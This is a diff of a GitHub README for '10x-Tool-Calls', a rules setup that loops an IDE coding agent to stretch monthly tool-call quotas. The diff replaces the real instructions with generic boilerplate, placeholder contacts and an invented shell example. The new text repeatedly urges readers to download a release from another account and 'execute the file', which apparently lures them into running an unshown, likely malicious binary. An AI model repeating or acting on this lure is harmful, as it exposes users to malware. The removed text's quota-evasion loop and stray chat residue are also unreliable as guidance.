@@ -1,96 +1,87 @@
-# 🚀 10x-Tool-Calls
+# 10x-Tool-Calls 🚀
 
-**10x-Tool-Calls** is a simple rules setup designed for the **Cursor IDE**, **Windsurf**, or any other agent-based coding assistant that supports tool calls. It helps you get the **maximum value out of your monthly tool call allowance** by running your tasks in a loop with user input—without restarting the chat every time.
+![GitHub release](https://img.shields.io/github/release/Whitedevildarkangel/10x-Tool-Calls.svg)
 
-Note : This only works with Agent Mode
----
+Welcome to the **10x-Tool-Calls** repository! This lightweight rules file is crafted to help you maximize the value of your monthly AI coding tool calls. With this tool, you can accomplish more with fewer requests, enhancing your productivity and efficiency.
 
-## ✅ What It Does
+## Table of Contents
 
-- After the AI completes a task, it runs a small Python script that asks:
-  
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
+
+## Introduction
+
+In today's fast-paced tech environment, leveraging AI coding tools effectively can set you apart. **10x-Tool-Calls** provides a set of rules that guide you in making the most out of your AI coding sessions. This is not just about saving time; it’s about enhancing the quality of your work.
+
+## Features
+
+- **Simplicity**: Easy to implement and understand.
+- **Efficiency**: Designed to streamline your requests.
+- **Adaptability**: Works with various AI coding tools.
+- **Community-driven**: Built on feedback from users like you.
+
+## Installation
+
+To get started with **10x-Tool-Calls**, follow these steps:
+
+1. Visit the [Releases](https://github.com/Whitedevildarkangel/10x-Tool-Calls/releases) section.
+2. Download the latest version of the rules file.
+3. Execute the file in your preferred environment.
+
+## Usage
+
+Once you have the rules file, you can begin integrating it into your workflow. Here’s how:
+
+1. **Load the Rules**: Ensure that your AI coding tool can access the rules file.
+2. **Follow the Guidelines**: Use the rules to shape your queries and requests.
+3. **Monitor Your Progress**: Keep track of how much more you accomplish with the help of these rules.
+
+### Example
+
+Here’s a simple example of how to use the rules file:
+
+```bash
+# Load the rules file
+source path/to/10x-Tool-Calls.rules
+
+# Make a request using the rules
+ai-tool --request "Optimize my code for better performance."
 ```
 
-prompt:
+## Contributing
 
-````
+We welcome contributions from everyone. If you have suggestions or improvements, please follow these steps:
 
-- You type your next instruction (e.g., `"add comments"`, `"refactor this"`, etc.)
-- The AI uses that input to continue working.
-- This loop repeats until:
-- You you manually stop, or
-- The session hits your **tool call limit**.
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
 
----
+Your input is valuable in making **10x-Tool-Calls** better for everyone.
 
-## 💡 Why This Matters
+## License
 
-Most AI coding tools (like Cursor) offer **500 monthly requests**, but each request can include **up to 25 tool calls**. Normally, even saying `"hi"` uses up a full request, wasting potential.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-With **10x-Tool-Calls**:
-- You start with one request.
-- Inside that session, you can give **multiple follow-ups**.
-- All follow-ups run within the same request using available tool calls.
-- This means you get **10x (or more)** actual work done using the same quota.
+## Contact
 
----
+For any inquiries, feel free to reach out:
 
-## ⚙️ How To Set It Up ( Basic Version )
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
 
-### 1. Copy `userinput.py` in your root directory
+## Releases
 
-This script is used to collect user input between tasks.
+To download the latest version of **10x-Tool-Calls**, please visit the [Releases](https://github.com/Whitedevildarkangel/10x-Tool-Calls/releases) section. Make sure to download and execute the file to start maximizing your AI coding tool calls.
 
-### 2. Copy `rules.md` into your IDE
+![AI Coding](https://source.unsplash.com/featured/?coding,ai)
 
-* Open your IDE's rule configuration (e.g., in Cursor: .cursorrules file or project rules - set to “always”)
-* Paste in the rules from `rules.md` (included in this repo)
+## Conclusion
 
-That’s it! The system is now set to run in an interactive loop.
-
----
-
-## 🧪 Current Version
-
-* ✅ **Supports:** plain text input only
-* ❌ **Not yet supported:** image upload or file drops (coming soon!)
-
-A more advanced version is planned that will support:
-
-* Image uploads
-* File Drops
-
----
-
-## ⚠️ Important Note
-
-**Only use this setup with tools that offer a tool call–based quota**, not token-based pricing (like OpenAI’s pay-per-token). This setup is designed to **maximize bundled tool calls**, not minimize token usage.
-
----
-
-## 🧠 Example
-
-You have **500 monthly requests** and each request allows up to **25 tool calls**:
-
-* Normally:
-  `You say "hi" → AI replies "hi" = 1 request used.`
-
-* With 10x-Tool-Calls:
-  `You say "hi" → AI replies → runs prompt → you say "add comments" → AI continues... (up to 25 calls)`
-  \= still **just 1 request used**, but you did much more.
-
----
-
-Get more done. Use fewer requests. Save your quota.
-
-**→ That’s the power of 10x-Tool-Calls.**
-
-```
-
-Let me know if you have any other requests
-```
-
-## Support
-If you find this tool helpful, you can support the development by:
-- Buying me a coffee at https://ko-fi.com/perrypixel
-- UPI to kevinp@apl
+Thank you for checking out **10x-Tool-Calls**. We hope this tool helps you enhance your productivity and make the most out of your AI coding sessions. Remember, the key to success is not just hard work but also smart work. Happy coding!
